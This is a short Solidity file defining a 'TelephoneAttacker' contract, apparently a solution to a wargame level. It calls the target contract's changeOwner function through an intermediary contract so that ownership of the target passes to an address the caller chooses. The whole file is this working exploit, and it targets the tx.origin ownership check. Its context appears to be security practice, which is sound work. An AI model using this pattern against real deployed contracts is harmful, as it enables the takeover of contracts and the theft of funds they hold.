// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

    ITelephone public targetaddress;
    
    constructor() {

    }

    function setContract(address _contractAddress) public {
        targetaddress = ITelephone(_contractAddress);
    }

    function attacker(address _newowner) public {
        targetaddress.changeOwner(_newowner);
    }
}